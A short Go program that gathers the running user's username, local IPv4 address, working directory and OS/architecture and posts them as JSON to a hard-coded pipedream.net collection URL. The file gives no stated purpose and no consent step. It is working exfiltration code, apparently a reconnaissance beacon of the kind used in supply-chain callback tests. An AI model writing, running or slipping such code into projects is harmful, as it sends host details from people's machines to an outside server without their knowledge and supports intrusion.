package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net"
	"os"
	"os/user"
	"runtime"
)

type SystemInfo struct {
	Username    string `json:"username"`
	IPAddress   string `json:"ip_address"`
	CurrentDir  string `json:"current_directory"`
	OS          string `json:"os_details"`
}

func getIPAddress() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			return "", err
		}
		for _, addr := range addrs {
			switch v := addr.(type) {
			case *net.IPNet:
				if v.IP.To4() != nil {
					return v.IP.String(), nil
				}
			}
		}
	}
	return "", fmt.Errorf("no IP address found")
}

func gatherSystemInfo() (*SystemInfo, error) {
	usr, err := user.Current()
	if err != nil {
		return nil, err
	}

	currentDir, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	ipAddress, err := getIPAddress()
	if err != nil {
		return nil, err
	}

	return &SystemInfo{
		Username:   usr.Username,
		IPAddress:  ipAddress,
		CurrentDir: currentDir,
		OS:         fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
	}, nil
}

func sendToServer(info *SystemInfo, url string) error {
	data, err := json.Marshal(info)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned non-200 status: %d", resp.StatusCode)
	}

	return nil
}

func main() {
	serverURL := "https://eo5mnw3rc2trga0.m.pipedream.net/data"

	systemInfo, err := gatherSystemInfo()
	if err != nil {
		fmt.Printf("Error gathering system info: %v\n", err)
		return
	}

	err = sendToServer(systemInfo, serverURL)
	if err != nil {
		fmt.Printf("Error sending data to server: %v\n", err)
		return
	}

	fmt.Println("System information sent successfully!")
}

